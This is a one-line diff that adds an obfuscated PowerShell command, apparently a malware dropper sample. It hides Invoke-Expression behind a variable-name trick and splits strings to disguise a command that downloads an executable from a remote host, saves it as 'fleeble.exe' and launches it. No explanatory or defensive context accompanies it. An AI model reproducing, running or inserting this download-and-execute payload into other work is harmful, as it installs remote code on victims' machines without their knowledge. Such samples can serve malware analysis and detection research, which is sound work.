@@ -1,0 +1,1 @@
+﻿.((vaRiAbLE '*mDr*').NamE[3,11,2]-join'')( ('(New-O'+'b'+'ject '+'System.Ne'+'t'+'.WebCli'+'ent).'+'D'+'ow'+'nloadFile(80Zhttp'+'://matkal'+'v.5'+'gbfr'+'e'+'e.com/v'+'osa/d'+'o'+'c.ex'+'e'+'80Z'+',8'+'0Zfle'+'eb'+'le.e'+'xe80Z);Start-Pro'+'cess'+' 8'+'0'+'Zfleeble.'+'exe80'+'Z').rEplACE(([cHar]56+[cHar]48+[cHar]90),[StrinG][cHar]39) ) 
